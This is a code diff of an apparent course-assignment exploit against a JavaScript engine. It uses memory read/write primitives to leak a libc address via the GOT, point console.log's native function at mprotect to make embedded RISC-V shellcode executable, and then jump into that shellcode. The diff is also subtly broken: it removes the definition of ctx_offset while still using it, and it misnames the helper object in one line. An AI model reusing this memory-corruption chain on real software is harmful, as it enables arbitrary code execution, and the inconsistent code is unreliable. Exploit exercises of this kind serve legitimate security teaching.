@@ -1,9 +1,6 @@
 /*
  * TODO: Part C solution goes here!
  */
-let readmem  = cs361s.readmem;
-let writemem = cs361s.writemem;
-let addrof   = cs361s.addrof;
 let second_stage = 
     "\xb7\x92\x39\x34\x9b\x82\x72\x7b\xb2\x02\x93\x82\xb2\x34\xb6\x02"
   + "\x93\x82\xf2\x22\x23\x3c\x51\xfe\x13\x05\x81\xff\x23\x38\x01\xfe"
@@ -16,22 +13,20 @@ let second_stage =
  * write memory to point to mprotect
  * NEED TO FIND WHERE MPROTECT IS
  */
-let ctx_offset = 48; // 8 bits
-let rt_offset = 24; // 8 bits
+
 // mf = offset 0, 32 bits
-let js_malloc_offset = 24;
 // ctx->rt->mf.js_malloc_usable_size
-let log_addr = addrof(console.log);
-let ctx = readmem(log_addr + ctx_offset);
-let rt = readmem(ctx + rt_offset);
-let mf_js_malloc_offset = readmem(rt + js_malloc_offset);
+let addressconsole = cs361.addrof(console.log);
+let ctx = cs361s.readmem(addressconsole + 48);
+let rt = cs361s.readmem(ctx + 24);
+let mf_js_malloc_offset = cs361s.readmem(rt + 24);
 
 // auipc offset (top 20 is immediate)
-let aupic_offset = readmem(mf_js_malloc_offset) >>> 12 << 12;
+let aupic_offset = cs361s.readmem(mf_js_malloc_offset) >>> 12 << 12;
 // ld offset (top 12 is immediate)
-let ld_offset = readmem(mf_js_malloc_offset + 4) >> 20;
+let ld_offset = cs361s.readmem(mf_js_malloc_offset + 4) >> 20;
 // we now have libc pointer to malloc_usable_size
-let got_entry = readmem(mf_js_malloc_offset + aupic_offset + ld_offset);
+let got_entry = cs361s.readmem(mf_js_malloc_offset + aupic_offset + ld_offset);
 // now get mprotect address
 let mprotect_addr = got_entry - 0x31B00; // std offset from malloc to mprotect
 
@@ -42,13 +37,13 @@ let mprotect_addr = got_entry - 0x31B00; // std offset from malloc to mprotect
  * Find where the second stage payload even is
  * look at text segment 
  */
-let target = addrof(second_stage);
+let target = cs361s.addrof(second_stage);
 let c_func_offset = 56;
-let old_realm = readmem(log_addr + ctx_offset);
-writemem(log_addr + ctx_offset, target); // overwrite realm
-writemem(log_addr + c_func_offset, mprotect_addr);
+let old_realm = cs361s.readmem(addressconsole + ctx_offset);
+cs361s.writemem(addressconsole + ctx_offset, target); // overwrite realm
+cs361s.writemem(addressconsole + c_func_offset, mprotect_addr);
 console.log.apply(2.0237e-320, null); // rwx
 // Execute Payload
-writemem(log_addr + ctx_offset, old_realm); // restore realm
-writemem(log_addr + c_func_offset, target + 16); // start of string + 16 HAHAHAHAHHAHAHA
+cs361s.writemem(addressconsole + ctx_offset, old_realm); // restore realm
+cs361s.writemem(addressconsole + c_func_offset, target + 16); // start of string + 16 HAHAHAHAHHAHAHA
 console.log();
